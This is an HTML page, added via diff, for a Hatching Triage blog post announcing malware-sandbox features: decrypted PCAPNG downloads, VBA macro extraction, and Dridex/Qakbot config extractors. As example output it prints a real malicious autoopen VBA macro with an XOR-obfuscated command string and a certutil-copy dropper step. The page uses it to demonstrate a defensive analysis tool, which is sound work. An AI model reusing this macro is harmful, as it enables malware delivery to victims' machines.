@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-41.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-41.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>Triage Thursday Episode 1: Open registration and a busy week of updates</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom ">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+          <h5>Triage Updates</h5>
+        
+        <h2>Triage Thursday Episode 1: Open registration and a busy week of updates</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-41.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2020-08-06T00:00:00Z">2020-08-06</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=triage">triage</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/pete.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Pete Cowman</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <blockquote>
+<p>Updated 06 Aug 2020</p>
+</blockquote>
+<p>This has been a busy week with Triage updates, and to give an overview of everything that has arrived we have updated this blogpost to include a few things that weren&rsquo;t around at the start of the week. There are a few different things to cover below, but first off - <strong>we are happy to announce that Triage is moving to open registration</strong>. You no longer need to request an invite, just <a href="https://tria.ge/login">go to the website</a> and sign up!</p>
+<p>Other updates are listed here:</p>
+<ul>
+<li><a href="#pcapng">PCAPNG download containing decrypted HTTPS traffic</a></li>
+<li><a href="#vba-macros">Automated dumping of VBA macros during static processing</a></li>
+<li><a href="#configs">Improved config extractors for Dridex and Qakbot</a></li>
+</ul>
+<p>This post also forms the start of our new Triage Thursday blogs, which will be a regular update series documenting changes and improvements pushed out over the course of the week. We hope you&rsquo;ll find these useful to stay up to date with the available features, and to get the most out of Triage.</p>
+<p>Read on below for more information!</p>
+<h3 id="pcapng">Access Decrypted SSL/TLS Traffic via PCAPNG</h3>
+<p>Decryption of HTTP network traffic has been built into Triage from the start but until now had only been visible in the analysis report, which will most likely not include all communications. With this update, we are also making available a new PCAPNG (PCAP Next Generation) file download which contains the full traffic dump with HTTPS already decrypted.</p>
+<p>You can find the new download option to the left of the report UI.</p>
+<figure><img src="../../static/images/blog/pcapng-download/reportui.png">
+</figure>
+
+<p>In order to open the file with Wireshark/TShark, you will want to use at least <strong>version 3</strong> of the program, as previous versions do not include support for the embedded TLS Master Secrets (TLS encryption keys) that we embed in the PCAPNG file. Note that the default version on some Linux distributions is still 2.x and hence may require updating manually.</p>
+<p>For the sake of compatibility, for now the original PCAP download will continue to be available as well.</p>
+<h4 id="download-via-api">Download via API</h4>
+<p>As with the standard PCAP files, you can also fetch the PCAPNG dump through the API via this endpoint:</p>
+<pre><code>GET https://api.tria.ge/v0/samples/{sampleID}/{taskID}/dump.pcapng
+</code></pre>
+<p>For example:</p>
+<pre><code>curl -H 'Authorization: Bearer &lt;YOUR_ACCESS_KEY&gt;' \
+  'https://api.tria.ge/v0/samples/{sampleID}/{taskID}/dump.pcapng' \
+  --output dump.pcapng
+</code></pre>
+<h3 id="vba-macros">Dump and view VBA macros</h3>
+<p>Our second new feature this week expands our support of malicious Office documents to also dump VBA macros and make them available directly in the report.</p>
+<p>This occurs during static processing of the sample, and as such the output is visible in that section of the report:</p>
+<figure><img src="../../static/images/blog/pcapng-download/vba-macro-extracted.png">
+</figure>
+
+<h4 id="api-access">API Access</h4>
+<p>This data is included in the <code>static.json</code> file which can be accessed <a href="https://tria.ge/docs/cloud-api/samples/#get-samplessampleidreportsstatic">via our API</a>.</p>
+<p>For example:</p>
+<pre><code>curl -H 'Authorization: Bearer &lt;YOUR_ACCESS_KEY&gt;' \
+  'https://api.tria.ge/v0/samples/{sampleID}/reports/static' | \
+  jq .files[].metadata.macros
+</code></pre>
+<p>The raw data in the report will resemble the following output from the command above, using the Triage analysis <a href="https://tria.ge/200803-4gyx191a5n/static1">200803-4gyx191a5n</a> as an example:</p>
+<pre><code>[
+  {
+    &quot;name&quot;: &quot;ThisDocument&quot;,
+    &quot;control&quot;: [],
+    &quot;source&quot;: &quot;Attribute VB_Name = \&quot;ThisDocument\&quot;\r\nAttribute VB_Base = \&quot;1Normal.ThisDocument\&quot;\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n&quot;
+  },
+  {
+    &quot;name&quot;: &quot;T&quot;,
+    &quot;control&quot;: [],
+    &quot;source&quot;: &quot;Attribute VB_Name = \&quot;T\&quot;\r\nSub autoopen()\r\nzh = h(\&quot;12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%25%4%29%95%13%27%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77\&quot;)\r\n\r\nDim a8 As New WshShell\r\nCall a8.run(\&quot;cmd /c set u=tutil&amp;&amp;call copy C:\\Windows\\System32\\cer%u%.exe C:\\ProgramData\\1.exe\&quot;, 0)\r\nCall a8.run(zh, 0)\r\n\r\nEnd Sub\r\n&quot;
+  },
+  {
+    &quot;name&quot;: &quot;d&quot;,
+    &quot;control&quot;: [],
+    &quot;source&quot;: &quot;Attribute VB_Name = \&quot;d\&quot;\r\nFunction h(OB)\r\nVR = Split(OB, \&quot;%\&quot;)\r\nFor MF = 0 To UBound(VR)\r\n hv = hv &amp; Chr(VR(MF) Xor 111)\r\nNext MF\r\nh = hv\r\nEnd Function\r\nFunction vY()\r\nvY = \&quot;util\&quot;\r\nEnd Function\r\n&quot;
+  }
+]
+</code></pre>
+<h3 id="configs">Improved config extraction for Dridex and Qakbot</h3>
+<p>We have also been doing some under-the-hood work to extend our config extraction capabilities, and these have allowed us to improve detection for a few families.</p>
+<h4 id="dridex">Dridex</h4>
+<p>The new Dridex extractor dumps C2 URLs, version number, and RC4 keys from Dridex payloads when they are detected at submission or during behavioural analysis.</p>
+<p>Example:<a href="https://tria.ge/200806-bj3bhjvkn2/behavioral1">200806-bj3bhjvkn2</a></p>
+<figure><img src="../../static/images/blog/pcapng-download/dridex_config.png">
+</figure>
+
+<p>The extractor currently only supports x86 payloads, though we have also improved general family detection for x64 variants.</p>
+<h4 id="qakbot">Qakbot</h4>
+<p>Our old Qakbot extractor had limited coverage and wasn&rsquo;t working well with newer samples, so we have made some improvements to increase its usefulness. It now supports a much wider range of the family&rsquo;s variations, dumping C2 URLs and the campaign&rsquo;s botnet ID.</p>
+<figure><img src="../../static/images/blog/pcapng-download/qakbot_config.png">
+</figure>
+
+<p>Stay tuned for additional tweaks to our Qakbot support, as we are working on some additional minor changes to further improve coverage.</p>
+<hr>
+<p>As usual, thanks to everyone who is submitting feedback to us from their Triage usage. Keep it coming! We have a few things coming up but it&rsquo;s always great to hear what is most needed by you. You can reach us using the feedback form on the website or via <a href="https://twitter.com/hatching_io">Twitter</a>.</p>
+<p>Not signed up yet? Head over to <a href="https://tria.ge/">https://tria.ge/</a> and register an account - no invite request needed!</p>
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>Detecting Sodin</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/ransomware-part2/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Updates for AgentTesla, GoldDragon, BlackCat and Trickbot NWorm</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2022-01-27/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Acquisition News and Detection Updates</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/acquisition-recorded-future/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Custom Yara Support</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/custom-yara/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
